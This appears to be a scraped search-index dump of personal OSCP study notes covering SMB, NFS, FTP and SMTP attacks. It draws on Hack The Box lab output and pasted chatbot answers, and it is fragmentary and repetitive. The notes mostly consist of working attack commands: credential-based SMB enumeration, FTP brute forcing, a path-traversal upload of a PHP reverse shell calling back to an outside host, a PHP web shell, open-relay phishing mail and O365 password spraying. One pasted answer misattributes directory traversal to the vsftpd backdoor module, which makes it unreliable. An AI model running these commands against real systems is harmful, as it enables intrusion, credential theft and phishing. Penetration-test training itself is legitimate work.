2022-03-31 12:17:19 -07:00 [File] {Red}\u003cKeepExtExactRed|R|^\\\\.sqldump$|310B|3/31/2022 12:05:02 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Development\\AddPublish.sqldump) .sqldump 2022-03-31 12:17:19 -07:00 [Share] {Green}(\\\\ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL\\WsusContent) 2022-03-31 12:17:19 -07:00 [File] {Red}\u003cKeepExtExactRed|R|^\\\\.keychain$|295B|3/31/2022 12:08:42 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Infosec\\SetStep.keychain) .keychain 2022-03-31 12:17:19 -07:00 [File] {Black}\u003cKeepExtExactBlack|R|^\\\\.tblk$|279B|3/31/2022 12:05:25 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Development\\FindConnect.tblk) .tblk 2022-03-31 12:17:19 -07:00 [File] {Black}\u003cKeepExtExactBlack|R|^\\\\.psafe3$|301B|3/31/2022 12:09:33 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Development\\GetUpdate.psafe3) .psafe3 2022-03-31 12:17:19 -07:00 [File] {Red}\u003cKeepExtExactRed|R|^\\\\.keypair$|278B|3/31/2022 12:09:09 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Infosec\\UnprotectConvertTo.keypair) .keypair 2022-03-31 12:17:19 -07:00 [File] {Black}\u003cKeepExtExactBlack|R|^\\\\.tblk$|280B|3/31/2022 12:05:17 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Development\\ExportJoin.tblk) .tblk 2022-03-31 12:17:19 -07:00 [File] {Red}\u003cKeepExtExactRed|R|^\\\\.mdf$|305B|3/31/2022 12:09:27 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Development\\FormatShow.mdf) .mdf 2022-03-31 12:17:19 -07:00 [File] {Red}\u003cKeepExtExactRed|R|^\\\\.mdf$|299B|3/31/2022 12:09:14 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Development\\LockConfirm.mdf) .mdf \u003cSNIP\u003e cube111@htb[/htb]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin\nSMB 172.16.5.5 445 ACADEMY-EA-DC01 [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)\nSMB 172.16.5.5 445 ACADEMY-EA-DC01 [+] INLANEFREIGHT.LOCAL\\forend:Klmcargo2\nGPP_AUTO‚Ä¶ 172.16.5.5 445 ACADEMY-EA-DC01 [+] Found SYSVOL share\nGPP_AUTO‚Ä¶ 172.16.5.5 445 ACADEMY-EA-DC01 [*] Searching for Registry.xml\nGPP_AUTO‚Ä¶ 172.16.5.5 445 ACADEMY-EA-DC01 [*] Found INLANEFREIGHT.LOCAL/Polic\nSMB GHOST\nNITIATION of the Attack Step SMBGhost Concept of Attacks - Category 1. The client sends a request manipulated by the attacker to the SMB server. Source 2. The sent compressed packets are processed according to the negotiated protocol responses. Process 3. This process is performed with the system's privileges or at least with the privileges of an administrator. Privileges 4. The local process is used as the destination, which should process these compressed packets. Destination This is when the cycle starts all over again, but this time to gain remote access to the target system.\nTrigger Remote Code Execution Step SMBGhost Concept of Attacks - Category 5. The sources used in the second cycle are from the previous process. Source 6. In this process, the integer overflow occurs by replacing the overwritten buffer with the attacker's instructions and forcing the CPU to execute those instructions. Process 7. The same privileges of the SMB server are used. Privileges 8. The remote attacker system is used as the destination, in this case, granting access to the local system. Destination However, despite the vulnerability's complexity due to the buffer's manipulation, which we can see in the PoC, the concept of the attack nevertheless applies here.",
    "description": "net use Z: \\\\10.0.0.122\\print$ /user:anonymous \"\"\nPS C:\\Users\\shaik\u003e copy z:\\x64 .\nPS C:\\Users\\shaik\u003e ls\nsudo nmap 10.129.14.128 -sV -sC -p139,445 smbclient -N -L //10.129.14.128 smbclient //10.129.14.128/notes smbmap -H 10.129.14.128 cube111@htb[/htb]$ smbmap -H 10.129.14.128 -r notes cube111@htb[/htb]$ smbmap -H 10.129.14.128 --download \"notes\\note.txt\" cube111@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt \"notes\\test.txt\" cube111@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users SMB 172.16.5.5 445 ACADEMY-EA-DC01 [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False) SMB 172.",
    "tags": [],
    "title": "smb",
    "uri": "/oscp-notes/smb/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "NFS Export Option Client root UID mapped to Root Priv Esc Potential root_squash (default) nobody (UID 65534) ‚ùå No no_root_squash root (UID 0) ‚úÖ Yes # NFS Enumeration and Exploitation Cheat Sheet --- ## 1. Ports and Services - **Port 111/tcp** ‚Äî Portmapper (rpcbind) - **Port 2049/tcp** ‚Äî NFS server --- ## 2. Initial Enumeration ### Nmap NSE Scripts for NFS ```bash nmap -p 111,2049 --script=nfs* \u003ctarget_ip\u003e This runs scripts to enumerate NFS services and related info. List exported NFS shares bash Copy Edit showmount -e \u003ctarget_ip\u003e This shows the shares the NFS server exports. 3. Mounting NFS Shares bash Copy Edit sudo mount -t nfs \u003ctarget_ip\u003e:/exported/share /mnt/nfs Mount the exported share locally for inspection.",
    "description": "NFS Export Option Client root UID mapped to Root Priv Esc Potential root_squash (default) nobody (UID 65534) ‚ùå No no_root_squash root (UID 0) ‚úÖ Yes # NFS Enumeration and Exploitation Cheat Sheet --- ## 1. Ports and Services - **Port 111/tcp** ‚Äî Portmapper (rpcbind) - **Port 2049/tcp** ‚Äî NFS server --- ## 2. Initial Enumeration ### Nmap NSE Scripts for NFS ```bash nmap -p 111,2049 --script=nfs* \u003ctarget_ip\u003e This runs scripts to enumerate NFS services and related info.",
    "tags": [],
    "title": "nfs",
    "uri": "/oscp-notes/nfs/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "use passive command if dir listing diesnt work\nftp\u003e status Connected to 10.129.14.136. No proxy connection. Connecting using address family: any. Mode: stream; Type: binary; Form: non-print; Structure: file Verbose: on; Bell: off; Prompting: on; Globbing: on Store unique: off; Receive unique: off Case: off; CR stripping: on Quote control characters: on Ntrans: off Nmap: off Hash mark printing: off; Use of PORT cmds: on Tick counter printing: off ftp\u003e debug Debugging on (debug=1). ftp\u003e trace Packet tracing on. ftp\u003e ls ---\u003e PORT 10,10,14,4,188,195 200 PORT command successful. Consider using PASV. ---\u003e LIST 150 Here comes the directory listing. -rw-rw-r-- 1 1002 1002 8138592 Sep 14 16:54 Calender.pptx drwxrwxr-x 2 1002 1002 4096 Sep 14 17:03 Clients drwxrwxr-x 2 1002 1002 4096 Sep 14 16:50 Documents drwxrwxr-x 2 1002 1002 4096 Sep 14 16:50 Employees -rw-rw-r-- 1 1002 1002 41 Sep 14 16:45 Important Notes.txt 226 Directory send OK. In the following example, we can see that if the hide_ids=YES setting is present, the UID and GUID representation of the service will be overwritten, making it more difficult for us to identify with which rights these files are written and uploaded.\nHiding IDs - YES FTP\nftp\u003e ls ---\u003e TYPE A 200 Switching to ASCII mode. ftp: setsockopt (ignored): Permission denied ---\u003e PORT 10,10,14,4,223,101 200 PORT command successful. Consider using PASV. ---\u003e LIST 150 Here comes the directory listing. -rw-rw-r-- 1 ftp ftp 8138592 Sep 14 16:54 Calender.pptx drwxrwxr-x 2 ftp ftp 4096 Sep 14 17:03 Clients drwxrwxr-x 2 ftp ftp 4096 Sep 14 16:50 Documents drwxrwxr-x 2 ftp ftp 4096 Sep 14 16:50 Employees -rw-rw-r-- 1 ftp ftp 41 Sep 14 16:45 Important Notes.txt -rw------- 1 ftp ftp 0 Sep 15 14:57 testupload.txt 226 Directory send OK. Another helpful setting we can use for our purposes is the ls_recurse_enable=YES. This is often set on the vsFTPd server to have a better overview of the FTP directory structure, as it allows us to see all the visible content at once.\nRecursive Listing FTP\nftp\u003e ls -R ---\u003e PORT 10,10,14,4,222,149 200 PORT command successful. Consider using PASV. ---\u003e LIST -R 150 Here comes the directory listing. .: -rw-rw-r-- 1 ftp ftp 8138592 Sep 14 16:54 Calender.pptx drwxrwxr-x 2 ftp ftp 4096 Sep 14 17:03 Clients drwxrwxr-x 2 ftp ftp 4096 Sep 14 16:50 Documents drwxrwxr-x 2 ftp ftp 4096 Sep 14 16:50 Employees -rw-rw-r-- 1 ftp ftp 41 Sep 14 16:45 Important Notes.txt -rw------- 1 ftp ftp 0 Sep 15 14:57 testupload.txt ./Clients: drwx------ 2 ftp ftp 4096 Sep 16 18:04 HackTheBox drwxrwxrwx 2 ftp ftp 4096 Sep 16 18:00 Inlanefreight ./Clients/HackTheBox: -rw-r--r-- 1 ftp ftp 34872 Sep 16 18:04 appointments.xlsx -rw-r--r-- 1 ftp ftp 498123 Sep 16 18:04 contract.docx -rw-r--r-- 1 ftp ftp 478237 Sep 16 18:04 contract.pdf -rw-r--r-- 1 ftp ftp 348 Sep 16 18:04 meetings.txt ./Clients/Inlanefreight: -rw-r--r-- 1 ftp ftp 14211 Sep 16 18:00 appointments.xlsx -rw-r--r-- 1 ftp ftp 37882 Sep 16 17:58 contract.docx -rw-r--r-- 1 ftp ftp 89 Sep 16 17:58 meetings.txt -rw-r--r-- 1 ftp ftp 483293 Sep 16 17:59 proposal.pptx ./Documents: -rw-r--r-- 1 ftp ftp 23211 Sep 16 18:05 appointments-template.xlsx -rw-r--r-- 1 ftp ftp 32521 Sep 16 18:05 contract-template.docx -rw-r--r-- 1 ftp ftp 453312 Sep 16 18:05 contract-template.pdf ./Employees: 226 Directory send OK. cube111@local[/local]$ wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136 --2021-09-19 14:45:58-- ftp://anonymous:*password*@10.129.14.136/ =\u003e ‚Äò10.129.14.136/.listing‚Äô Connecting to 10.129.14.136:21... connected. Logging in as anonymous ... Logged in! ==\u003e SYST ... done. ==\u003e PWD ... done. ==\u003e TYPE I ... done. ==\u003e CWD not needed. ==\u003e PORT ... done. ==\u003e LIST ... done. 12.12.1.136/.listing [ \u003c=\u003e ] 466 --.-KB/s in 0s sudo nmap -sV -p21 -sC -A 10.129.14.136 cube111@local[/local]$ nc -nv 10.129.14.136 21 FTP\ncube111@local[/local]$ telnet 10.129.14.136 21 It looks slightly different if the FTP server runs with TLS/SSL encryption. Because then we need a client that can handle TLS/SSL. For this, we can use the client openssl and communicate with the FTP server. The good thing about using openssl is that we can see the SSL certificate, which can also be helpful.\nFTP\ncube111@local[/local]$ openssl s_client -connect 10.129.14.136:21 -starttls ftp ftp-ssl 10.129.14.136\nBrute Forcing Brute Forcing with Medusa Attacking FTP\ncube111@local[/local]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp hydra -l cube -P rockyou.txt ftp://10.0.0.1\nThe Nmap -b flag can be used to perform an FTP bounce attack:\nAttacking FTP\ncube111@local[/local]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2 VULNERABILITY CHECK\n2. Directory Traversal What It Is : Poorly configured FTP servers may allow directory traversal attacks, enabling attackers to access files outside the FTP root directory.\nWhy It‚Äôs Useful : You can read or write files outside the intended directory, potentially gaining access to sensitive system files.\nHow to Check :\nAttempt to traverse directories using payloads like:\n1\nGET ../../../../../../etc/passwd\nTools like metasploit or custom scripts can automate this testing.\nExample Exploit :\nUse msfconsole with the exploit/unix/ftp/vsftpd_234_backdoor module to test for directory traversal vulnerabilities. Qwen2.5-Max3:51 pm\nYes, there are several FTP vulnerabilities that you can explore during an OSCP (Offensive Security Certified Professional) exam or penetration test. These vulnerabilities range from Remote Code Execution (RCE) to privilege escalation and misconfigurations. Below is a list of FTP-related vulnerabilities and techniques you should check for:\n1. Anonymous FTP Access What It Is : Many FTP servers allow anonymous login with default credentials (anonymous:anonymous or ftp:ftp).\nWhy It‚Äôs Useful : Anonymous access can provide valuable information, such as sensitive files, configuration files, or backups.\nHow to Check :\nbash\n1\n2\nftp \u003ctarget-ip\u003e\n# Try logging in with ‚Äúanonymous‚Äù as the username and any password (e.g., ‚Äúanonymous‚Äù).\nPost-Exploitation :\nLook for sensitive files like .bash_history, configuration files, or backup files. Use tools like dirb or gobuster to enumerate directories. 2. Directory Traversal What It Is : Poorly configured FTP servers may allow directory traversal attacks, enabling attackers to access files outside the FTP root directory.\nWhy It‚Äôs Useful : You can read or write files outside the intended directory, potentially gaining access to sensitive system files.\nHow to Check :\nAttempt to traverse directories using payloads like:\n1\nGET ../../../../../../etc/passwd\nTools like metasploit or custom scripts can automate this testing.\nExample Exploit :\nUse msfconsole with the exploit/unix/ftp/vsftpd_234_backdoor module to test for directory traversal vulnerabilities. 3. vsftpd Backdoor (Version 2.3.4) What It Is : A well-known backdoor exists in vsftpd version 2.3.4 , which allows attackers to gain a shell by exploiting a malicious smiley face (:)) in the username field.\nWhy It‚Äôs Useful : This vulnerability provides direct RCE on vulnerable systems.\nHow to Check :\nVerify the FTP server version:\nbash\n1nmap -p21 ‚Äìscript=banner \u003ctarget-ip\u003e\nnmap -p21 ‚Äìscript=banner \u003ctarget-ip\u003e\nIf the version is 2.3.4, exploit it using Metasploit:\nmsfconsole\nuse exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS \u003ctarget-ip\u003e\nrun\nmsfconsole\nuse exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS \u003ctarget-ip\u003e\nrun\nPost-Exploitation :\nOnce you gain a shell, escalate privileges or pivot to other systems. 4. ProFTPD Mod_Copy Vulnerability What It Is : The mod_copy module in ProFTPD allows attackers to copy files to arbitrary locations on the server. Why It‚Äôs Useful : You can upload malicious files (e.g., PHP shells) to web-accessible directories. How to Check : Confirm the FTP server is running ProFTPD: nmap -p21 ‚Äìscript=ftp-proftpd-backdoor \u003ctarget-ip\u003e\ntelnet \u003ctarget-ip\u003e 21\nSITE CPFR /path/to/source/file\nSITE CPTO /var/www/html/shell.php\nPost-Exploitation : Access the uploaded file via the web server (e.g., http://\u003ctarget-ip\u003e/shell.php). Qwen2.5-Max3:51 pm\nCoreFTP Exploitation Yes, there are several FTP vulnerabilities that you can explore during an OSCP (Offensive Security Certified Professional) exam or penetration test. These vulnerabilities range from Remote Code Execution (RCE) to privilege escalation and misconfigurations. Below is a list of FTP-related vulnerabilities and techniques you should check for:\ncube111@local[/local]$ curl -k -X PUT -H \"Host: \u003cIP\u003e\" --basic -u \u003cusername\u003e:\u003cpassword\u003e --data-binary \"PoC.\" --path-as-is https://\u003cIP\u003e/../../../../../../whoops curl -k -X PUT -H \"Host: 192.168.1.10\" --basic -u admin:password123 --data-binary \"\u003c?php \\$sock=fsockopen('192.168.1.20',4444);exec('/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263'); ?\u003e\" --path-as-is https://192.168.1.10/../../../../../../var/www/html/shell.php 1. Anonymous FTP Access What It Is : Many FTP servers allow anonymous login with default credentials (anonymous:anonymous or ftp:ftp).\nWhy It‚Äôs Useful : Anonymous access can provide valuable information, such as sensitive files, configuration files, or backups.\nHow to Check :\nbash\n1\n2\nftp \u003ctarget-ip\u003e\n# Try logging in with ‚Äúanonymous‚Äù as the username and any password (e.g., ‚Äúanonymous‚Äù).\nPost-Exploitation :\nLook for sensitive files like .bash_history, configuration files, or backup files. Use tools like dirb or gobuster to enumerate directories. 2. Directory Traversal What It Is : Poorly configured FTP servers may allow directory traversal attacks, enabling attackers to access files outside the FTP root directory.\nWhy It‚Äôs Useful : You can read or write files outside the intended directory, potentially gaining access to sensitive system files.\nHow to Check :\nAttempt to traverse directories using payloads like:\n1\nGET ../../../../../../etc/passwd\nTools like metasploit or custom scripts can automate this testing.\nExample Exploit :\nUse msfconsole with the exploit/unix/ftp/vsftpd_234_backdoor module to test for directory traversal vulnerabilities. 3. vsftpd Backdoor (Version 2.3.4) What It Is : A well-known backdoor exists in vsftpd version 2.3.4 , which allows attackers to gain a shell by exploiting a malicious smiley face (:)) in the username field.\nWhy It‚Äôs Useful : This vulnerability provides direct RCE on vulnerable systems.\nHow to Check :\nVerify the FTP server version:\nbash\n1\nnmap -p21 ‚Äìscript=banner \u003ctarget-ip\u003e\nIf the version is 2.3.4, exploit it using Metasploit:\nbash\n1\n2\n3\n4\nmsfconsole\nuse exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS \u003ctarget-ip\u003e\nrun\nPost-Exploitation :\nOnce you gain a shell, escalate privileges or pivot to other systems. 4. ProFTPD Mod_Copy Vulnerability What It Is : The mod_copy module in ProFTPD allows attackers to copy files to arbitrary locations on the server.\nWhy It‚Äôs Useful : You can upload malicious files (e.g., PHP shells) to web-accessible directories.\nHow to Check :\nConfirm the FTP server is running ProFTPD:\nbash\n1\nnmap -p21 ‚Äìscript=ftp-proftpd-backdoor \u003ctarget-ip\u003e\nUse the SITE CPFR and SITE CPTO commands to copy files:\ntelnet \u003ctarget-ip\u003e 21\nSITE CPFR /path/to/source/file\nSITE CPTO /var/www/html/shell.php\nPost-Exploitation :\nAccess the uploaded file via the web server (e.g., http://\u003ctarget-ip\u003e/shell.php). 5. FTP Bounce Attack What It Is : Some FTP servers allow attackers to use the PORT command to redirect traffic to third-party IPs and ports.\nWhy It‚Äôs Useful : You can mask your identity or scan internal networks through the FTP server.\nHow to Check :\nUse Nmap with the -b flag:\nbash\n1\nnmap -Pn -v -n -p80 -b anonymous:password@\u003cftp-server-ip\u003e \u003ctarget-ip\u003e\nPost-Exploitation :\nUse the FTP server as a proxy for scanning or exfiltrating data. 6. Misconfigured Permissions What It Is : FTP servers may have weak permissions that allow unauthorized users to upload or download files. Why It‚Äôs Useful : You can upload malicious files (e.g., reverse shells) or download sensitive files. How to Check : Log in to the FTP server and attempt to upload/download files:\nbash\necho ‚Äò\u003c?php system($_GET[‚Äúcmd‚Äù]); ?\u003e‚Äô \u003e shell.php\nftp \u003ctarget-ip\u003e\nput shell.php /var/www/html/shell.php\ncurl http://\u003ctarget-ip\u003e/shell.php?cmd=id",
    "description": "use passive command if dir listing diesnt work\nftp\u003e status Connected to 10.129.14.136. No proxy connection. Connecting using address family: any. Mode: stream; Type: binary; Form: non-print; Structure: file Verbose: on; Bell: off; Prompting: on; Globbing: on Store unique: off; Receive unique: off Case: off; CR stripping: on Quote control characters: on Ntrans: off Nmap: off Hash mark printing: off; Use of PORT cmds: on Tick counter printing: off ftp\u003e debug Debugging on (debug=1).",
    "tags": [],
    "title": "ftp",
    "uri": "/oscp-notes/ftp/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "Step Tool/Command Purpose Port + Banner check nmap -p 25 --script=smtp* \u003cip\u003e Service \u0026 vuln info Open relay test nmap -p 25 --script=smtp-open-relay \u003cip\u003e Check relay status User enumeration nmap -p 25 --script=smtp-enum-users \u003cip\u003e Find valid users Send test mail swaks --to victim@domain.com --server \u003cip\u003e Test open relay/send mail irfan@irfan-VirtualBox:~$ sudo nmap 127.0.0.1 -sC -sV -p25\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-05 16:00 EST\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.000095s latency).\nPORT STATE SERVICE VERSION\n25/tcp open smtp Postfix smtpd\n| ssl-cert: Subject: commonName=mint\n| Subject Alternative Name: DNS:mint\n| Not valid before: 2025-03-01T06:22:06\n|_Not valid after: 2035-02-27T06:22:06\n|_ssl-date: TLS randomness does not represent time\n|_smtp-commands: irfan-VirtualBox.hsd1.ct.comcast.net, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING\nService Info: Host: irfan-VirtualBox.hsd1.ct.comcast.net\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 1.72 seconds\nCHECK FOR OPEN RELAY\nsudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v cube111@local[/local]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT Nmap scan report for 10.10.11.213 Host is up (0.28s latency). PORT STATE SERVICE 25/tcp open smtp |_smtp-open-relay: Server is an open relay (14/16 tests) Next, we can use any mail client to connect to the mail server and send our email.\nAttacking Email Services\ncube111@local[/local]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213 === Trying 10.10.11.213:25... === Connected to 10.10.11.213. \u003c- 220 mail.localdomain SMTP Mailer ready -\u003e EHLO parrot \u003c- 250-mail.localdomain \u003c- 250-SIZE 33554432 \u003c- 250-8BITMIME \u003c- 250-STARTTLS \u003c- 250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1 \u003c- 250 HELP -\u003e MAIL FROM:\u003cnotifications@inlanefreight.com\u003e \u003c- 250 OK -\u003e RCPT TO:\u003cemployees@inlanefreight.com\u003e \u003c- 250 OK -\u003e DATA \u003c- 354 End data with \u003cCR\u003e\u003cLF\u003e.\u003cCR\u003e\u003cLF\u003e -\u003e Date: Thu, 29 Oct 2020 01:36:06 -0400 -\u003e To: employees@inlanefreight.com -\u003e From: notifications@inlanefreight.com -\u003e Subject: Company Notification -\u003e Message-Id: \u003c20201029013606.775675@parrot\u003e -\u003e X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/ -\u003e -\u003e Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/ -\u003e -\u003e -\u003e . \u003c- 250 OK -\u003e QUIT \u003c- 221 Bye === Connection closed with remote host. sendemail -f 'jonas@localhost' -t 'mailadmin@localhost' -s 192.168.184.140:25 -u 'another spreadsheet' -m 'spreadsheet' -a /home/kali/pentestools/windows/clientside/test.ods Feb 23 15:54:03 kali sendemail[3004302]: Email was sent successfully! Port Service TCP/25 SMTP Unencrypted TCP/143 IMAP4 Unencrypted TCP/110 POP3 Unencrypted TCP/465 SMTP Encrypted TCP/587 SMTP Encrypted/STARTTLS TCP/993 IMAP4 Encrypted TCP/995 POP3 Encrypted Client (MUA) ‚ûû Submission Agent (MSA) ‚ûû Open Relay (MTA) ‚ûû Mail Delivery Agent (MDA) ‚ûû Mailbox (POP3/IMAP) Command Description AUTH PLAIN AUTH is a service extension used to authenticate the client. HELO The client logs in with its computer name and thus starts the session. MAIL FROM The client names the email sender. RCPT TO The client names the email recipient. DATA The client initiates the transmission of the email. RSET The client aborts the initiated transmission but keeps the connection between client and server. VRFY The client checks if a mailbox is available for message transfer. EXPN The client also checks if a mailbox is available for messaging with this command. NOOP The client requests a response from the server to prevent disconnection due to time-out. QUIT The client terminates the session. EHLOSMTP\ncube111@local[/local]$ telnet 10.129.14.128 25 Trying 10.129.14.128... Connected to 10.129.14.128. Escape character is '^]'. 220 ESMTP Server EHLO inlanefreight.local 250-mail1.inlanefreight.local 250-PIPELINING 250-SIZE 10240000 250-ETRN 250-ENHANCEDSTATUSCODES 250-8BITMIME 250-DSN 250-SMTPUTF8 250 CHUNKING MAIL FROM: \u003ccry0l1t3@inlanefreight.local\u003e 250 2.1.0 Ok RCPT TO: \u003cmrb3n@inlanefreight.local\u003e NOTIFY=success,failure 250 2.1.5 Ok DATA 354 End data with \u003cCR\u003e\u003cLF\u003e.\u003cCR\u003e\u003cLF\u003e From: \u003ccry0l1t3@inlanefreight.local\u003e To: \u003cmrb3n@inlanefreight.local\u003e Subject: DB Date: Tue, 28 Sept 2021 16:32:51 +0200 Hey man, I am trying to access our XY-DB but the creds don't work. Did you make any changes there? . 250 2.0.0 Ok: queued as 6E1CF1681AB QUIT 221 2.0.0 Bye Connection closed by foreign host. VRFY Command [!bash!]$ telnet 10.10.110.20 25 Trying 10.10.110.20... Connected to 10.10.110.20. Escape character is '^]'. 220 parrot ESMTP Postfix (Debian/GNU) VRFY root 252 2.0.0 root VRFY www-data 252 2.0.0 www-data VRFY new-user 550 5.1.1 \u003cnew-user\u003e: Recipient address rejected: User unknown in local recipient table EXPN Command [!bash!]$ telnet 10.10.110.20 25 Trying 10.10.110.20... Connected to 10.10.110.20. Escape character is '^]'. 220 parrot ESMTP Postfix (Debian/GNU) EXPN john 250 2.1.0 john@inlanefreight.local EXPN support-team 250 2.0.0 carol@inlanefreight.local 250 2.1.5 elisa@inlanefreight.local smts secure tls\nopenssl s_client -connect smtp.gmail.com:587 -tls1_2 -starttls smtp\nopenssl s_client -connect 10.129.14.128:imaps\nVRFY BRUTE\nsmtp-user-enum -M VRFY -U k -t 10.129.26.44 -w 10 -v\n[!bash!]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.local -t 10.129.203.7 Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum ) ---------------------------------------------------------- | Scan Information | ---------------------------------------------------------- Mode ..................... RCPT Worker Processes ......... 5 Usernames file ........... userlist.txt Target count ............. 1 Username count ........... 78 Target TCP port .......... 25 Query timeout ............ 5 secs Target domain ............ inlanefreight.local ######## Scan started at Thu Apr 21 06:53:07 2022 ######### 10.129.203.7: jose@inlanefreight.local exists 10.129.203.7: pedro@inlanefreight.local exists 10.129.203.7: kate@inlanefreight.local exists ######## Scan completed at Thu Apr 21 06:53:18 2022 ######### 3 results. 78 queries in 11 seconds (7.1 queries / sec) Password Attacks-Spray Hydra - Password Attack [!bash!]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3 Hydra v9.1 (c) 2020 by van Hauser/THC \u0026 David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-13 11:37:46 [INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal! [DATA] max 16 tasks per 1 server, overall 16 tasks, 67 login tries (l:67/p:1), ~5 tries per task [DATA] attacking pop3://10.10.110.20:110/ [110][pop3] host: 10.129.42.197 login: john password: Company01! 1 of 1 target successfully completed, 1 valid password found cat /etc/postfix/main.cf | grep -v \"#\" | sed -r \"/^\\s*$/d\" error codes\nhttps://serversmtp.com/smtp-error/\nMicrosoft¬†oulook /365 enumeration\nO365 Spray [!bash!]$ python3 o365spray.py --validate --domain msplaintext.xyz *** O365 Spray *** \u003e----------------------------------------\u003c \u003e version : 2.0.4 \u003e domain : msplaintext.xyz \u003e validate : True \u003e timeout : 25 seconds \u003e start : 2022-04-13 09:46:40 \u003e----------------------------------------\u003c [2022-04-13 09:46:40,344] INFO : Running O365 validation for: msplaintext.xyz [2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz Now, we can attempt to identify usernames.\n[!bash!]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz *** O365 Spray *** \u003e----------------------------------------\u003c \u003e version : 2.0.4 \u003e domain : msplaintext.xyz \u003e enum : True \u003e userfile : users.txt \u003e enum_module : office \u003e rate : 10 threads \u003e timeout : 25 seconds \u003e start : 2022-04-13 09:48:03 \u003e----------------------------------------\u003c [2022-04-13 09:48:03,621] INFO : Running O365 validation for: msplaintext.xyz [2022-04-13 09:48:04,062] INFO : [VALID] The following domain is using O365: msplaintext.xyz [2022-04-13 09:48:04,064] INFO : Running user enumeration against 67 potential users [2022-04-13 09:48:08,244] INFO : [VALID] lewen@msplaintext.xyz [2022-04-13 09:48:10,415] INFO : [VALID] juurena@msplaintext.xyz [2022-04-13 09:48:10,415] INFO : [ * ] Valid accounts can be found at: '/opt/o365spray/enum/enum_valid_accounts.2204130948.txt' [ * ] All enumerated accounts can be found at: '/opt/o365spray/enum/enum_tested_accounts.2204130948.txt' [2022-04-13 09:48:10,416] INFO : Valid Accounts: 2 O365 Spray - Password Spraying [!bash!]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz *** O365 Spray *** \u003e----------------------------------------\u003c \u003e version : 2.0.4 \u003e domain : msplaintext.xyz \u003e spray : True \u003e password : March2022! \u003e userfile : usersfound.txt \u003e count : 1 passwords/spray \u003e lockout : 1.0 minutes \u003e spray_module : oauth2 \u003e rate : 10 threads \u003e safe : 10 locked accounts \u003e timeout : 25 seconds \u003e start : 2022-04-14 12:26:31 \u003e----------------------------------------\u003c [2022-04-14 12:26:31,757] INFO : Running O365 validation for: msplaintext.xyz [2022-04-14 12:26:32,201] INFO : [VALID] The following domain is using O365: msplaintext.xyz [2022-04-14 12:26:32,202] INFO : Running password spray against 2 users. [2022-04-14 12:26:32,202] INFO : Password spraying the following passwords: ['March2022!'] [2022-04-14 12:26:33,025] INFO : [VALID] lewen@msplaintext.xyz:March2022! [2022-04-14 12:26:33,048] INFO : [ * ] Writing valid credentials to: '/opt/o365spray/spray/spray_valid_credentials.2204141226.txt' [ * ] All sprayed credentials can be found at: '/opt/o365spray/spray/spray_tested_credentials.2204141226.txt' [2022-04-14 12:26:33,048] INFO : Valid Credentials: 1 Latest Email Service Vulnerabilities One of the most recent publicly disclosed and dangerous Simple Mail Transfer Protocol (SMTP) vulnerabilities was discovered in OpenSMTPD up to version 6.6.2 service was in 2020. This vulnerability was assigned CVE-2020-7247 and leads to 